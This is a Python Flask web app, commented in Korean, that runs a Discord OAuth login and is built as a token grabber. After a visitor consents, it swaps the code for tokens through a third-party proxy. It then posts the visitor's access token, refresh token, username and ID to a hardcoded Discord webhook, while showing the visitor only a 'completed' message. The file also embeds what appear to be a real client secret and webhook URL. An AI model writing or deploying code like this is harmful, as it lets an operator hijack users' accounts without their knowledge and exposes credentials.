import os
import requests
import logging
from flask import Flask, redirect, request, jsonify

# ==========================================
# 1. 환경 변수 로더 (실패 시 백업값 100% 보장)
# ==========================================
try:
    from dotenv import load_dotenv
    load_dotenv()
except ImportError:
    pass

def fetch_env(key_name, fallback_value=None):
    val = os.getenv(key_name) or os.environ.get(key_name)
    if val and val.strip():
        return val.strip()
    val = os.getenv(key_name.lower()) or os.environ.get(key_name.lower())
    if val and val.strip():
        return val.strip()
    return fallback_value


app = Flask(__name__)

# Render 환경 변수가 비어있어도 하드코딩된 값으로 100% 작동
CLIENT_ID = fetch_env("DISCORD_CLIENT_ID", "1549778071404412988")
CLIENT_SECRET = fetch_env("DISCORD_CLIENT_SECRET", "5ahJy_7rUWhUOig9LTNd1tr-V8Oq_CWl")
REDIRECT_URI = fetch_env("DISCORD_REDIRECT_URI", "https://discord-oauth2-7e2n.onrender.com/oauth2")
WEBHOOK_URL = fetch_env("DISCORD_WEBHOOK_URL", "https://discord.com/api/webhooks/1550129913313370162/BS2-CU23SjLqX0VYttqKAMGpTGMh01n3sxdwloxk0eTo7jmyANaRGW_474BwiIFyOA0B")

DISCORD_AUTH_URL = "https://discord.com/oauth2/authorize"
DISCORD_API_URL = "https://discord-proxy.cls110623.workers.dev"

HEADERS = {
    "User-Agent": "DiscordBot (https://discord-oauth2-7e2n.onrender.com, 1.0.0)"
}

logging.basicConfig(level=logging.INFO)


# ==========================================
# 2. 메인 접속 시 즉시 승인 페이지 이동
# ==========================================
@app.route('/')
def index():
    discord_login_url = (
        f"{DISCORD_AUTH_URL}"
        f"?client_id={CLIENT_ID}"
        f"&redirect_uri={REDIRECT_URI}"
        f"&response_type=code"
        f"&scope=identify%20email"
    )
    return redirect(discord_login_url)


# ==========================================
# 3. 콜백 처리 & 웹후크 전송
# ==========================================
@app.route('/oauth2')
def oauth2_callback():
    code = request.args.get('code')
    error = request.args.get('error')

    if error or not code:
        return "인증이 취소되었거나 오류가 발생했습니다.", 400

    token_url = f"{DISCORD_API_URL}/oauth2/token"
    payload = {
        'client_id': CLIENT_ID,
        'client_secret': CLIENT_SECRET,
        'grant_type': 'authorization_code',
        'code': code,
        'redirect_uri': REDIRECT_URI
    }
    headers = {**HEADERS, 'Content-Type': 'application/x-www-form-urlencoded'}

    try:
        # 1. 토큰 발급
        token_res = requests.post(token_url, data=payload, headers=headers, timeout=10)
        if token_res.status_code != 200:
            return f"토큰 발급 실패 (Status {token_res.status_code}): {token_res.text}", token_res.status_code
        
        token_data = token_res.json()
        access_token = token_data.get('access_token')
        refresh_token = token_data.get('refresh_token', '없음')

        # 2. 유저 정보 조회
        user_url = f"{DISCORD_API_URL}/users/@me"
        user_headers = {**HEADERS, 'Authorization': f"Bearer {access_token}"}
        user_res = requests.get(user_url, headers=user_headers, timeout=10)
        user_data = user_res.json() if user_res.status_code == 200 else {}

        username = user_data.get('username', '알 수 없음')
        user_id = user_data.get('id', '알 수 없음')

        # 3. 디스코드 웹후크 전송
        if WEBHOOK_URL:
            webhook_payload = {
                "embeds": [{
                    "title": "🔑 디스코드 토큰 발급 완료",
                    "color": 5814783,
                    "fields": [
                        {"name": "👤 사용자", "value": f"`{username}` (ID: {user_id})", "inline": False},
                        {"name": "🎟️ Access Token", "value": f"```\n{access_token}\n```", "inline": False},
                        {"name": "🔄 Refresh Token", "value": f"```\n{refresh_token}\n```", "inline": False},
                        {"name": "⏱️ 만료 시간", "value": f"{token_data.get('expires_in')}초", "inline": True},
                        {"name": "📜 Scope", "value": f"{token_data.get('scope')}", "inline": True}
                    ]
                }]
            }
            # 웹후크 응답 결과를 콘솔 서버 로그에 출력
            res = requests.post(WEBHOOK_URL, json=webhook_payload, timeout=5)
            print(f"[WEBHOOK LOG] Status: {res.status_code}, Response: {res.text}")

        # 4. 화면 출력
        return "<h2>✅ 인증이 완료되었습니다. 이 창을 닫으셔도 됩니다.</h2>"

    except Exception as e:
        return f"처리 중 오류 발생: {str(e)}", 500


if __name__ == '__main__':
    port = int(fetch_env("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
